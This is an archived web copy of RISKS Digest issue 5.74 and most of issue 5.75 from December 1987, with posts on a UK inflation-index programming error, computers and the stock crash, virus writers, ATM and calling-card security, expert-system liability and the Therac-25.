<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 74</H1>
<H2> Monday, 14 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Rounding error costs DHSS 100 million pounds 
</A>
<DD>
<A HREF="#subj1.1">
Robert Stroud
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computers' Role in Stock Market Crash 
</A>
<DD>
<A HREF="#subj2.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  The Infarmation Age 
</A>
<DD>
<A HREF="#subj3.1">
Ivan M. Milman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Virus programs and Chain letters 
</A>
<DD>
<A HREF="#subj4.1">
David G. Grubbs
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Baby monitors can also be very efficient "jammers", too. 
</A>
<DD>
<A HREF="#subj5.1">
Rob Warnock
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  The Saga of the Lost ATM Card 
</A>
<DD>
<A HREF="#subj6.1">
Alan Wexelblat
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Interchange of ATM Cards 
</A>
<DD>
<A HREF="#subj7.1">
Ted Lee
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  PacBell Calling Card Security (or lack thereof) 
</A>
<DD>
<A HREF="#subj8.1">
Brent Chapman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  IBM invaded by a Christmas virus 
</A>
<DD>
<A HREF="#subj9.1">
Franklin Davis
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Rounding error costs DHSS 100 million pounds
</A>
</H3>
<address>
Robert Stroud 
&lt;<A HREF="mailto:robert%cheviot.newcastle.ac.uk@NSS.Cs.Ucl.AC.UK">
robert%cheviot.newcastle.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Mon, 14 Dec 87 09:45:00 GMT
</i><PRE>

This is an extract from a front-page report in the Independent (12 Dec 1987).
It would appear that for over a year, due to a programming error, the
government have been underestimating inflation by 0.1%. The cumulative
effect of this error on index-linked payments such as pensions amounts
to 100 million pounds which they have a statutory obligation to pay back.

The interesting question this poses is what level of error would be considered
reasonable in calculating inflation. Even a 0.001% error would cost 1 million
pounds by this reckoning, and yet averaging the price of commodities introduces
spurious accuracy when in practice prices will be to the nearest 0.5p.

Robert Stroud, Computing Laboratory, University of Newcastle upon Tyne.
UUCP ...!ukc!cheviot!robert

  "DHSS in 100m pounds inflation blunder - pensioners to get payment after
  computer error" by Steve Levinson and Colin Hughes

  Reproduced without permission from The Independent (Sat 12th Dec 1987)
  Copyright (c) Newspaper Publishing PLC 1987

  More than nine million pensioners are shortly to receive a tax-free lump sum
  bonus of between 7.50 and 12.00 pounds after the Government yesterday
  admitted that a computer error had led to publication of incorrect inflation
  figures for the past 21 months.

  The pay out to pensioners will cost an estimated 100 million pounds, but
  other social security recipients, who include some of the poorest, will not
  be reimbursed for the error which has meant that benefit increases have not
  kept pace with inflation.

  [... Lots of stuff about how the government will only reimburse those
  benefits for which it has a legal obligation or has made a pledge to keep
  pace with inflation, despite the fact that most other forms of benefit are
  usually raised in line with inflation, and how this is likely to cause a
  political row(!) ...]

  Although the computer error at the Department of Employment has meant an
  understatement of only 0.1% in inflation, it is difficult to conceive of a
  more embarrassing mistake or one that affects more people. Pay negotiators,
  taxpayers, savers, and pensioners are all caught up in its implications.

  The department does not intend recalculating past inflation figures,
  but says that yesterday's 4.1% rate for the year to November is correct.
  The error itself is put down to a mistake made early last year when a
  programmer, seeking to speed up the process of analysing each month's
  prices, entered details for household goods which omitted everything
  after the decimal point. [I assume this means pence rather than pounds!]

  Nobody noticed and from January this year the new program was given wider
  application to other goods, including clothing. The effect was that all
  Retail Price Index numbers [the official measure of inflation] between
  February 1986 and January 1987 were 0.06 points too low, and after January
  1987, a further 0.09 understatement was added. The error was spotted
  purely by chance only last month when a new attempt was made to speed
  up the process of analysing price information.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computers' Role in Stock Market Crash
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
13 Dec 87 22:05:59 PST (Sunday)
</i><PRE>
To: RISKS@csl.sri.com
From: Rodney Hoffman &lt;Hoffman.es@Xerox.COM&gt;

The Friday, Dec. 11 'Wall Street Journal' ran a story headlined "Were Computers
a Help or a Hindrance?  Securities Industry Asks After the Crash" by Michael W.
Miller.  It was one of several articles trying to put the recent crash in
perspective.  What's particularly interesting is that the piece is not narrowly
focused on the role of computers in the crash.  Instead, it's a thoughtful
questioning of "the ways computers changed Wall Street".  The whole article is
well worth reading.  A few edited excerpts:

   Portfolio insurance, index arbitrage and other modern Wall Street 
   trading innovations that depend on ever speedier and more complex 
   trades ... wouldn't have been possible with the more than 200 Tandem 
   TNX and TXP computers of Securities Industry Automation Corp. (SIAC), 
   run by the New York and American stock exchanges.... SIAC's system is
   one of the biggest collections of computer power gathered under a
   single roof.  Its workings have grown so vast that today SIAC uses
   computers to keep track of all its computers.  
   
   Did electronic analysis and trading produce a whole new breed of 
   high-tech investors whose criteria have nothing to do with the 
   traditional corporate and economic forces behind stock movements?  
   "I think there is a tendency today to substitute trading for 
   investment," says former U.S. Attorney General Nicholas deB. 
   Katzenbach, who was commissioned last spring to study program 
   trading for the Big Board.  "Computers are an element of that, 
   sure.  but I don't think it's just because of computers."  Which 
   came first?...
   
   One way or another, the computer has transformed the stock market 
   in ways unimaginable even a few years ago. ... The volatile growth 
   is "a real monster, and it's obviously one that we cannot control," 
   a top SIAC official says.  In many ways, Wall Street was an unusually 
   ripe target for computerization.  Nowhere does faster, better 
   information command such a high premium....
    
   In hindsight, it seems that computers on Wall Street created an  
   appetite they ultimately couldn't satisfy.  Following the classic 
   addicts' pattern, each time investors got more powerful computers,  
   they developed investment techniques that needed even more powerful 
   computers....
   
   A rethinking of computer-aided trading in inevitable... But curtailing
   powerful technology already in wide use isn't easy -- as any arms 
   negotiator can attest.... Moreover, Wall Street is worried about 
   what the Japanese may come up with.  A state-of-the-art futures 
   market is scheduled to open in Tokyo in March.  Observes Ramon Villareal 
   or Tandem:  "Once you've got the tools, if you don't use them, someone 
   else will."

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
The Infarmation Age
</A>
</H3>
<address>
Ivan M. Milman
&lt;<A HREF="mailto:ivan@sally.utexas.edu ">
ivan@sally.utexas.edu 
</A>&gt;
</address>
<i>
Mon, 14 Dec 87 23:00:50 CST
</i><PRE>

The business section of the December 14th (Monday) edition of the Austin
American-Statesman had a 4-column feature article entitled "Modern farmers
plow profit with computers."  The article discussed at great length all the
benefits farmers are receiving by using computers.

Directly below the article is a section called "In Brief", and the first
headline is "Computer Trouble."  The paragraph described how the report of
humidity and soil temperatures provided every week by Blackland Research
Center was interrupted due to computer troubles.
                                                       
Ivan Milman
                    [Perhaps the computer was affected by humidity?  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Virus programs and Chain letters
</A>
</H3>
<address>
David G. Grubbs
&lt;<A HREF="mailto:dandelion.CI!dgg@husc6.harvard.edu ">
dandelion.CI!dgg@husc6.harvard.edu 
</A>&gt;
</address>
<i>
Sun, 13 Dec 87 20:50:57 est
</i><PRE>

When do we start treating these foolish, destructive, puerile acts as they
deserve?

Virus programs and Chain letters are not harmless pranks, as most of the
comments I've read lately seem to imply.  They waste immense amounts of our
two most precious resources: time and effort.  And they are, to my mind,
evidence of an anti-social behavior which deserves to be actively suppressed,
even attacked.

Persons caught sending a chain letter should have their mail privileges
suspended for some period, as a first offense, then removed entirely if the
idiocy continues.

Persons writing or distributing Virus programs should be warned, then kicked
out of whatever organization is affected, from a place of employment to
whatever social group is involved.  A prank without an appreciative and
approving audience is an anomaly.  Remove the audience and the act becomes
meaningless.

It is not possible to legislate maturity, termperance or responsibility, but
it IS possible to influence one's peers through social pressure.  These acts
are intolerable and it is up to YOU to do something about it.  Stop chuckling
at juvenile acts of destruction.  Let the perpetrators know they are out of
line, take steps to stop them and share the ideas that work with the rest of
us.

"If you aren't part of the solution, you will become part of the precipitate."

David G. Grubbs, Cognition Inc., 900 Tech Park Drive, Billerica, MA  01821
UUCP:  ...!{mit-eddie,talcott,necntc}!dandelion!dgg     (617) 667-4800

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
More risks of "baby monitors"        [when you wear your "jammers"?]
</A>
</H3>
<address>
Rob Warnock
&lt;<A HREF="mailto:amdcad!amdcad.AMD!rpw3@ames.arpa (rpw3) ">
amdcad!amdcad.AMD!rpw3@ames.arpa (rpw3) 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 7 Dec 87 20:25:16 GMT
Subject: Baby monitors can also be very efficient "jammers", too.

I was recently involved in helping with the logistics and security for
a large (several K people) outdoor event in Vermont, and we decided to
use a bunch of those Radio Shack "bug ears" short-range FM transceivers
for communications among monitors who would be spaced throughout the crowd
to handle medical emergencies, lost children, etc. Well, everything worked
just fine, until some VIPs started showing up a day or two ahead of the main
event. Suddenly, the 49 MHz band that the transceivers use began to be jammed
with a strong carrier, with a lot of 60 Hz "hum" and no (apparent) modulation.
The "jamming" came and went at various times, for several hours at a time.
We began to be worried that our careful public safety plan was going to be
destroyed by this "jamming"!

Finally, during a period of "jamming", we heard a loud baby cry, followed by
a door opening and the soothing tones of a mother.  Problem solved! (...after
some diplomacy, that is.) We were able to recover our public safety plan by
convincing the parents (who were fortunately part of the sponsering group)
to leave the baby monitor "off" during our practice drills, and during the
entire day of the main event.

What's the "Risk"? Both the short-range transceivers and the baby monitor
use the 49 MHz "public domain" band, which is the same band used by many
cordless telephones. (We had in fact thought that the "jamming" was a
cordless phone.) Who is to adjudicate conflicts when they arise? The
FCC regulations specifically state that any such device "(1) May not
cause any harmful interference to any other service; and (2) Must accept
whatever interference [that arises] from any other [licensed] service."

As more and more "deregulation" occurs and more and more "consumer" R.F.
(and infrared) devices show up on the market, conflicts of this type will
increase. I only know that not all of them will be settled so amicably as
the one described above.

Rob Warnock, Systems Architecture Consultant

UUCP:	  {amdcad,fortune,sun,attmail}!redwood!rpw3
ATTmail:  !rpw3
DDD:	  (415)572-2607
USPS:	  627 26th Ave, San Mateo, CA  94403

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
The Saga of the Lost ATM Card
</A>
</H3>
<address>
Alan Wexelblat 
&lt;<A HREF="mailto:wex%SW.MCC.COM@MCC.COM">
wex%SW.MCC.COM@MCC.COM
</A>&gt;
</address>
<i>
Mon, 14 Dec 87 10:06:09 CST
</i><PRE>

Last week, I went to my bank to order a new ATM card.  Here's why:

First, some background.  Austin is served by two major ATM networks, Pulse and
MBank.  Each accepts the others' cards for purposes of withdrawals and
transfers, but not deposits.  Very convenient - Pulse is a national network and
friends from Philly have been able to get cash while in town.

Saturday night I was in a supermarket buying food to bring to a friends'
dinner.  I realized I didn't have enough cash, so I used the ATM.  It was
MBank, but it had a big sticker indicating it would accept my Pulse card, so I
tried.  I got the cash and the receipt, but the machine didn't return my card.
I went to the supermarket service desk.

They helpfully informed me that they had no way of retreiving my card, but if I
was willing to hang around for a while "...the machine will probably spit it
out."  Does this happen often, I asked.  "All the time.  Usually the card comes
back in less than 10 minutes.  Sometimes it comes back when the next person
tries to do a transaction."

Well, I'm late for dinner, so I can't wait around.  Fortunately, I'm with a
friend and he has bank cards.  First, he tries one for an account he knows is
defunct.  The machine rejects it.  Then he tries his MBank card (brave fellow -
how does he know his card won't get swallowed, too?).  Both are returned by the
machine, but my card stays gone.

After a useless call to the MBank service number (answered by a security guard
who knows nothing) we leave.  I'm told that they empty the machines first thing
Monday morning, and I should get a phone call then.

When Wednesday rolls around and I haven't heard, I put in a call to MBank's
service number.  I explain my situation to a service rep who, upon finding that
I'm not an MBank customer clams up.  I have to call *my* bank, she says, and
get the card back from them.  Can she check and see if my bank has the card?
No.  Does she care that her bank's machine is regularly eating cards and
spitting them back at random intervals?  No.

So I call my bank's central customer service number and I'm told that they
still don't have the card.  But even if I did, I'd have to get a new one.
MBank returns them cut up, you see.  Why?  Because they consider it too risky
to mail the cards intact to my bank.  My bank has no trouble mailing the cards
to me.  But I'm a reasonable person, perhaps I can go to MBank and identify
myself and get my card back directly from them?  No... "Customer identification
is the problem of the owning bank."  Not that I can explain to this imbecile
that it doesn't matter whether my bank can identify me, since all they could
give me would be useless plastic scraps...

So now I have to wait 4-6 weeks for the central office to produce another card.
Fortunately, the PIN is not on the card, so my wife's card is still usable.
Anyone want to guess at the number of MBank machines I'll be using in the
future?
                              --Alan Wexelblat

UUCP: {harvard, gatech, pyramid, &amp;c.}!sally!im4u!milano!wex

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Interchange of ATM Cards
</A>
</H3>
<address>
&lt;<A HREF="mailto:TMPLee@DOCKMASTER.ARPA">
TMPLee@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Mon, 14 Dec 87 00:32 EST
</i><PRE>
To: risks@csl.sri.com

Although the details, especially the time period, are now fuzzy (perhaps
someone else from Minnesota can fill them in), it seems appropriate to note
that sometime after ATM's and competing ATM networks started to become popular
the Minnesota legislature passed a law REQUIRING that ALL ATM's accept each
other's cards.  The law was virtually unheralded.  I seem to recall being quite
surprised when, either by accident or out of idle curiosity, I first discovered
that the card for one network would work on another.  Most of the machines now
carry notices listing all of the other cards they will take; originally there
was no such notice.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
PacBell Calling Card Security (or lack thereof)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Sun, 13 Dec 87 21:36:14 PST
From: Brent Chapman &lt;chapman%mica.Berkeley.EDU@violet.berkeley.edu&gt;

I just recently got my new Pacific Bell Calling Card.  On the sheet describing
where, how, and why to use your card, there is a section (quoted):

    It's Secure.  Your Calling Card Number is made up of your billing
    number and a four-digit Security Code.  Your Calling Card cannot
    be used without this Security Code, so you are protected from
    unauthorized calling as long as you keep your code safe.

Sounds good, right?  Standard stuff.  _BUT_, elsewhere ON THE VERY SAME PAGE,
in the descriptions of where you can use your card, you find (emphasis mine):

    At Pacific Bell Credit Card Phones:  You'll find new Pacific Bell
    Credit Card Phones at airports and hotels near other Pacific Bell
    coin and coinless phones.  These, which will be appearing at many
    other locations as well, allow you to simply insert your Calling
    Card and press the number you want.  YOU DON'T EVEN NEED TO GIVE
    YOUR SECURITY CODE, BECAUSE THE MACHINE READS IT FROM THE CARD.

Gee, ain't technology wonderful?  Any bets that only PacBell can read the
code from the card?

Brent Chapman					Capital Market Technology, Inc.
Senior Programmer/Analyst			1995 University Ave., Suite 390
{lll-tis,ucbvax!cogsci}!capmkt!brent		Berkeley, CA  94704
capmkt!brent@{lll-tis.arpa,cogsci.berkeley.edu} Phone: 415/540-6400

    [If your card is lost or stolen, who needs to read the security code?
    By the way, there were several other messages along these lines,
    including one from David Robinson.  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
IBM invaded by a Christmas virus
</A>
</H3>
<address>
Franklin Davis 
&lt;<A HREF="mailto:fad@Think.COM">
fad@Think.COM
</A>&gt;
</address>
<i>
Mon, 14 Dec 87 09:38:55 est
</i><PRE>

    This article seems to have a lot of things in it that the reporter didn't
    understand.  I assume that the "terminals" in question are really PC's
    connected to the mainframes; for one thing.

Probably the users were connected by 3270 type terminals (or
emulations on a PC) which use a half-duplex block mode protocol.  If
you turn off such a terminal your session is aborted, and you lose
current edits.  It is also very difficult to interrupt an executing
program, since it "owns" the line.  There is a "system-attention" key,
but a busy system may take literally minutes to respond.  (I'm glad I
don't have to use an IBM mainframe any more!! :-)

--Franklin Davis         Thinking Machines Corp.         fad@think.com     

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.73.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.75.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-27</DOCNO>
<DOCOLDNO>IA012-000130-B022-377</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.75.html 128.240.150.127 19970217014621 text/html 25703
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:44:49 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 75</TITLE>
<LINK REL="Prev" HREF="/Risks/5.74.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.76.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.74.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.76.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 75</H1>
<H2> Tuesday, 15 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Advice to the Risklorn 
</A>
<DD>
<A HREF="#subj1.1">
Steven McBride
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Expert systems liability 
</A>
<DD>
<A HREF="#subj2.1">
George S. Cole via Martin Minow
</A><br>
<A HREF="#subj2.2">
 George Bray
</A><br>
<A HREF="#subj2.3">
      Dean Sutherland
</A><br>
<A HREF="#subj2.4">
 Bjorn Freeman-Benson
</A><br>
<A HREF="#subj2.5">
 William Swan
</A><br>
<A HREF="#subj2.6">
 Wm Brown III
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Microprocessors vs relay logic 
</A>
<DD>
<A HREF="#subj3.1">
Wm Brown III
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Advice to the Risklorn
</A>
</H3>
<address>
Steven McBride 
&lt;<A HREF="mailto:shamus@BOEING.COM">
shamus@BOEING.COM
</A>&gt;
</address>
<i>
Tue, 15 Dec 87 10:40:20 pst
</i><PRE>

Franklynn Peterson and Judi K-Turkel in their newspaper column "The
Business Computer" {(c) 1987 P. K. Associates, Inc.} discuss computer
problems with banks, phone companies, and supermarkets. The discussion
on phone billing which follows was new to me -

             Ripped off by computer mistake? Fight back
   
      . . .
      Before computerization, your phone company didn't charge you if
   nobody picked up at the other end. Now, if there's a busy signal or no
   answer to your ring, you may get charged for a one-minute call.  Unless
   you keep track of all your calls you may never even notice it.
      Has your bill ever shown two different minute-long phone calls made
   during the same minute of the same day? Ours has. It's a dead giveaway.
   It proves our servicer's computer can't tell a non-answer from a
   completed call.
      Many states have watchdog public service commissions. Ours specifies
   that we can't be charged for calls that reach nobody. But it also lets
   the phone company bill us incorrectly. The burden's on us to go through
   each bill circle all disputed charges, and write letters explaining why
   we're not paying them.
      These charges can mount up fast if you're phoning via computer. . .
      . . .
      Here's what's sad about all these computer-made annoyances: They're
   unnecessary. These very computers are capable of doing consumer-
   pleasing tasks at a penny a job. Why don't they? Because whoever bought
   them, programmed them, and manages them obviously doesn't want a system
   that can help customers. They want what's fastest or cheapest to design,
   easiest to manage, and most profitable for the firm.
      How can we change things? By joining in making the status quo grimmer
   than the task or reprogramming to give better service.
      We changed supermarkets when our once-favorite store refused to give
   pre-checkout pricing clues.
      We deduct from our phone bills all one-minute calls, putting the
   burden on the long distance carrier to show it any were completed.
      And when we clear up a blunder our bank's computer makes, we bill
   them a service charge. You're welcome to join us!

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Interesting note on expert systems liability from AI-Digest
</A>
</H3>
<address>
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com ">
minow%thundr.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
15 Dec 87 08:06
</i><PRE>

From:	DECWRL::"AIList-REQUEST@SRI.COM"
	"AIList Moderator Kenneth Laws  14-Dec-87 2224 PST"
AIList Digest            Tuesday, 15 Dec 1987     Volume 5 : Issue 283
...
Date: Thu 10 Dec 87 10:27:39-PST
From: George S. Cole &lt;GCOLE@Sushi.Stanford.EDU&gt;
Subject: Expert System Liability
 
 I have researched this area and a paper is forthcoming -- as soon as the
USC Computer/Law Journal editorial staff are ready -- on "Tort Liability for
Artificial Intelligence and Expert Systems". The trite answer is yes, there can
be a suit and EVERYBODY INVOLVED will be named -- because the plaintiff's
lawyer will realize that the law does not clearly know who is liable (including
the plaintiff).
        A short answer is to cite the Restatement of Torts, 2nd, Section 552:
"Information Negligently Supplied for the Guidance of Others:
    one who, in the course of his business, profession, or employment, or in
any other transaction in which he has a pecuniary interest, supplies false
information for the guidance of others in their business transactions, is
subject to liability for pecuniary loss caused to them by their justifiable
reliance upon the information, if he fails to exercise reasonable care or
competence in obtaining or communicating the information".
 
This section was cited without success in Black, Jackson and Simmons Insurance
Brokerage, Inc. v. IBM, 440 N.E. 2d 282, 109 Ill. App. 132 (1982). The phrase
"in the course of his business" was strictly construed to prevent liability
under this cause of action (there were others, including warranty) as the
court noted that the defendant had sold both hardware and software to allow
the firm to process information.  But in Independant School District No. 454,
Fairmont, Minnesota v. Statistical Tabulating Corporation, 359 F. Supp. 1095
(N.D. Ill, 1973) the court permitted a negligence action to be brought against
the third-party statistical bureau whose miscalculations had led to the
under-insurance of a school which had then burned down. The court stated:
"[O]ne may be liable to another for providing inaccurate information which
was relied upon and caused economic loss, although there was no direct
contractual relationship between the parties...The duty to do work reasonably
and in a workmanlike manner has always been imposed by law..." Factors the
court suggested to consider included (1) the existence, if any, of a guarantee
of correctness; (2) the defendant's knowledge that the plaintiff would rely
upon the information; (3) the restriction of potential liability to a small
group; (4) the absence of proof of any correction once found being delivered
to the plaintiff; (5) the undesirability of requiring an innocent party to
carry the burden of another's professional mistakes; and (6) the promotion
of cautionary techniques among the potential defendants for the protection
of all potential plaintiffs.
        Did the ES indeed make a mistake? Suppose Joe has said he plans to
invest for 15 years -- too short for real estate, too long for bonds, and
in that light the "Black Monday" might be seen as a temporary aberration.
(I.e. Joe caused the harm by selling out at the bottom rather than holding
on for the 15 years as planned.)
        Can the experts hide behind the company? Those who are professionals
(which is a legal phrase for "holders of a semi-monopoly") probably cannot be
fully shielded; the rest may have to seek indemnity from their corporation.
It will depend in part on their employment contract, or lack thereof.
        Can the knowledge engineers be found liable if their mistake led to
this? What sort of mistake? A standard programming flaw is not the same as
a design flaw. What if the mistake lies at the boundary -- who is responsible
for realizing that the computer has to have rules for assessing "market
psychology" that will quantitatively assess the subtle dynamics of what
the current "feel" for the market is? Did the domain experts learn that the
computer was going to do more than crunch numbers?
 
        This is both a nascent and a complex legal area. My hope is that a
number of the AI and ES companies realize the potential exposure and that the
evolution of the law can be influenced by their behavior -- and begin to
plan defensively. It is a bit more expensive initially, affecting immediate
profits; but it can provide tremendous savings both for the firm and for the
industry over the longer run.
                                George S. Cole, Esq.
                                793 Nash Av.
                                Menlo Park, CA  94025
                        GCole@Sushi.stanford.edu (until it goes away)
 
</PRE>
<HR><H3><A NAME="subj2.2">
Re: Can you sue an expert system (RISKS DIGEST 5.71)
</A>
</H3>
<address>
   George Bray 
&lt;<A HREF="mailto:lcc.ghb@SEAS.UCLA.EDU">
lcc.ghb@SEAS.UCLA.EDU
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 16:28:09 PST
</i><PRE>

The discussion of suing expert systems is similar to the issues raised by
[the case of the Therac 25].  I am talking about the several deaths and
serious injuries that have resulted from software failures in certain X-Ray
machines made by Atomic Energy Canada.  (See the latest issue of IEEE
Spectrum for a short summary article; an earlier issue (within the last
year) of IEEE Spectrum had a longer article on the same topic.)

Basically, a modification to the data entry software used by operators
resulted in the machine delivering extremely large doses of radiation
while indicating that only small amounts were delivered.  As I remember it,
the machine can generate electron beams directly, or use the electron
beams to generate X-rays.  The machine is supposed to lower a target
into the path of the beam to generate the X-rays.  

Apparently, when the operator did some kind of data editing operation
(I think it was use an up-arrow key), the software would get confused
and raise the target while setting the beam intensity to the huge values
needed to generate X-rays.  This editing code was added in response to
user's complaints about the primitive data entry in earlier versions
of the software.  If I remember correctly, the failure was caused by
some rare conjuction of situations that could occur if the operator
used the "up-arrow" key to edit data at just the right time.  I think
the bug was some variable that was also used in an interrupt routine.

Various family members of those injured or killed have sued everyone
responsible, including the software engineer who added the "user-friendly"
editing code.  This raises many issues.  On the one hand, there was no
doubt that the software bug killed and injured people, so it seems 
reasonable that the people who made the poor software are liable.
On the other hand, I believe that the bug was due to an unforeseen
interaction that would be very hard to eliminate.  These kinds of bugs
probably exist in much of the software in thw world.

What do RISKS readers think of the issues raised by this case?  Are 
programmers liable for their software's actions?

George Bray, Locus Computing Corporation

</PRE>
<HR><H3><A NAME="subj2.3">
Litigation over an expert system
</A>
</H3>
<address>
Dean Sutherland 
&lt;<A HREF="mailto:Sutherland@TL-20B.ARPA">
Sutherland@TL-20B.ARPA
</A>&gt;
</address>
<i>
Tue, 8 Dec 1987  09:43 EST
</i><PRE>

In Risks digest 5.71, chapman@russell.stanford.edu (Gary Chapman) mentions a
"goofy" California law that provides for a defendant who is only 1% responsible
to pay 1% of the judgement.  Although this law may be goofy, it is a major
improvement over previous versions.  Before this law was passed, it was
possible to have the following situation:

	Defendant A:  99% guilty, has assets of $10,000
	Defendant B:   1% guilty, has assets of $1,000,000,000
	Judgement of $10 million against defendants.  A pays $10,000 (or maybe
	nothing by declaring bankruptcy).  B pays $9,990,000... EVEN THOUGH B
	WAS FOUND TO BE ONLY 1% GUILTY.

The new version of the law is a BIG improvement.

Dean F. Sutherland, Tartan Labs

</PRE>
<HR><H3><A NAME="subj2.4">
Expert Systems Liability
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 08 Dec 87 12:09:03 PST
From: Bjorn Freeman-Benson &lt;bnfb@june.cs.washington.edu&gt;

Regarding the discussion of Expert System Liability in <A HREF="/Risks/5.69.html">RISKS-5.69</A>
